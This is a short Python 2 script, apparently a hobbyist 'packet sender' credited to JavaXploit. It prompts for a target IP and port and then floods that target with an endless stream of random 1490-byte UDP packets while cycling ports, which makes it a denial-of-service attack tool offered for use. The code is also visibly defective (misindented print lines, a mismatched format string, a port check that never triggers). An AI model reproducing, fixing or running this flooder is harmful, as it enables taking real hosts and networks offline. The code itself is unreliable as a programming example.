import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Hello!!")
print
   print"[+] AUTHOR    : JavaXploit - Indo"
   print"[+] COMMUNITY : Secure - Protect - Cyber S.C.P"
   print"[+] GITHUB    : -"
print
ip = raw_input("IP ADDRES : ")
port = input("PORT : ")

os.system("clear")
os.system("figlet Send to Packet")
print "[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(4)
print "[===============     ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 100
     port = port + 100
     print "ATTACK%ATTACK%ATTACK:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
